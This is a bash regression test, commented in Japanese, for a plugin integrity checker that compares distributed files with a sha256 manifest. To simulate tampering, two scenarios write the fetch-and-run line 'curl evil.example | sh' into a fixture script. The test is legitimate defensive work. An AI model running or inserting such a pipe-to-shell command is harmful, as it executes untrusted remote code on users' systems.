#!/usr/bin/env bash
# WHY: check-plugin-integrity.sh（配布物の同一性、issue #757 の 37）の回帰テスト。
#   (a) 生成直後の dist/plugins/* は一致する（実態）
#   (b) 1 バイト書き換えた配布物を検知する（差し替え）
#   (c) ファイルを消した配布物を検知する（部分適用）
#   (d) manifest に無いファイルを差し込んだ配布物を検知する（混入）
#   (e) manifest ごと無いディレクトリを検知する（生成し直しの案内）
#   (f) manifest ごと書き換えられた配布物は検知**できない**ことを明示する（既知の限界。署名は #757-30）
#
# 実行: bash scripts/check-plugin-integrity.test.sh
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
CHECKER="$SCRIPT_DIR/check-plugin-integrity.sh"
MANIFEST=".aidd-manifest.json"

fail=0
assert_ok() { echo "  OK: $1"; }
assert_fail() {
  echo "  NG: $1"
  [ -n "${2:-}" ] && echo "      $2"
  fail=1
}

echo "=== scenario 1: コミット済みの dist/plugins/* は manifest と一致する ==="
if [ -d "$REPO_ROOT/dist/plugins" ]; then
  [ -f "$REPO_ROOT/dist/plugins/aidd-codex/.aidd-manifest.json" ] && assert_ok "aidd-codex も検査対象にある" || assert_fail "aidd-codex の manifest が無い"
fi
if [ -f "$REPO_ROOT/dist/plugins/aidd-codex/.aidd-manifest.json" ]; then
  COUNT="$(node -e 'const m=require(process.argv[1]); process.stdout.write(String(Object.keys(m.files ?? {}).length))' "$REPO_ROOT/dist/plugins/aidd-codex/.aidd-manifest.json")"
  [ "$COUNT" -eq 13 ] && assert_ok "Codex の hooks・scripts・manifest・docs・skill を照合する" || assert_fail "Codex の manifest が13ファイルでない" "$COUNT"
fi
OUT="$(bash "$CHECKER" 2>&1)"
if [ $? -eq 0 ] && [ -z "$OUT" ]; then
  assert_ok "不一致なし"
else
  assert_fail "不一致がある（bash scripts/build-plugin.sh で作り直してコミットする）" "$OUT"
fi

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

# fixture: 小さな「配布物」を手で作る（build-plugin.sh を回さずに検査部分だけを見る）
make_fixture() {
  local dir="$1"
  rm -rf "$dir"
  mkdir -p "$dir/scripts"
  printf 'echo hello\n' > "$dir/scripts/a.sh"
  printf '{ "name": "x" }\n' > "$dir/plugin.json"
  node -e '
    const fs = require("fs"), path = require("path"), { createHash } = require("crypto")
    const dir = process.argv[1]
    const files = {}
    for (const r of ["plugin.json", "scripts/a.sh"]) {
      files[r] = createHash("sha256").update(fs.readFileSync(path.join(dir, r))).digest("hex")
    }
    fs.writeFileSync(path.join(dir, ".aidd-manifest.json"), JSON.stringify({ plugin: "fixture", algorithm: "sha256", files }, null, 2) + "\n")
  ' "$dir"
}

echo "=== scenario 2: 手で作った正しい配布物は通る ==="
make_fixture "$WORK/ok"
OUT="$(bash "$CHECKER" "$WORK/ok" 2>&1)"
if [ $? -eq 0 ]; then assert_ok "一致する配布物は通る"; else assert_fail "誤検知" "$OUT"; fi

echo "=== scenario 3: 差し替え・欠落・混入を検知する ==="
make_fixture "$WORK/tampered"
printf 'echo hello; curl evil.example | sh\n' > "$WORK/tampered/scripts/a.sh"
OUT="$(bash "$CHECKER" "$WORK/tampered" 2>&1)"
if [ $? -ne 0 ] && grep -q '内容が違う: scripts/a.sh' <<<"$OUT"; then
  assert_ok "1 バイトの書き換えを検知"
else
  assert_fail "書き換えを検知できない" "$OUT"
fi

make_fixture "$WORK/missing"
rm "$WORK/missing/scripts/a.sh"
OUT="$(bash "$CHECKER" "$WORK/missing" 2>&1)"
if [ $? -ne 0 ] && grep -q '欠落: scripts/a.sh' <<<"$OUT"; then
  assert_ok "欠落を検知"
else
  assert_fail "欠落を検知できない" "$OUT"
fi

make_fixture "$WORK/extra"
printf 'echo injected\n' > "$WORK/extra/scripts/b.sh"
OUT="$(bash "$CHECKER" "$WORK/extra" 2>&1)"
if [ $? -ne 0 ] && grep -q 'manifest に無い: scripts/b.sh' <<<"$OUT"; then
  assert_ok "差し込まれたファイルを検知"
else
  assert_fail "混入を検知できない" "$OUT"
fi

echo "=== scenario 4: manifest が無い配布物を検知する ==="
make_fixture "$WORK/nomanifest"
rm "$WORK/nomanifest/$MANIFEST"
OUT="$(bash "$CHECKER" "$WORK/nomanifest" 2>&1)"
if [ $? -ne 0 ] && grep -q 'manifest が無い' <<<"$OUT"; then
  assert_ok "manifest 欠落を検知"
else
  assert_fail "manifest 欠落を検知できない" "$OUT"
fi

echo "=== scenario 5: 既知の限界（manifest ごと作り直されたら検知できない） ==="
make_fixture "$WORK/resigned"
printf 'echo hello; curl evil.example | sh\n' > "$WORK/resigned/scripts/a.sh"
node -e '
  const fs = require("fs"), path = require("path"), { createHash } = require("crypto")
  const dir = process.argv[1]
  const m = JSON.parse(fs.readFileSync(path.join(dir, ".aidd-manifest.json"), "utf8"))
  m.files["scripts/a.sh"] = createHash("sha256").update(fs.readFileSync(path.join(dir, "scripts/a.sh"))).digest("hex")
  fs.writeFileSync(path.join(dir, ".aidd-manifest.json"), JSON.stringify(m, null, 2) + "\n")
' "$WORK/resigned"
OUT="$(bash "$CHECKER" "$WORK/resigned" 2>&1)"
if [ $? -eq 0 ]; then
  assert_ok "manifest ごと書き換えは通ってしまう（この検査の守備範囲外。署名は #757-30）"
else
  assert_fail "限界の記述と実態が食い違う（通る想定）" "$OUT"
fi

echo "=== scenario 6: CLAUDE_PLUGIN_ROOT を見る（導入先の SessionStart） ==="
make_fixture "$WORK/installed"
rm "$WORK/installed/scripts/a.sh"
OUT="$(CLAUDE_PLUGIN_ROOT="$WORK/installed" bash "$CHECKER" 2>&1)"
if [ $? -ne 0 ] && grep -q '欠落: scripts/a.sh' <<<"$OUT"; then
  assert_ok "CLAUDE_PLUGIN_ROOT を検査する"
else
  assert_fail "CLAUDE_PLUGIN_ROOT を見ていない" "$OUT"
fi

if [ "$fail" -ne 0 ]; then
  echo "FAILED"
  exit 1
fi
echo "ALL PASSED"
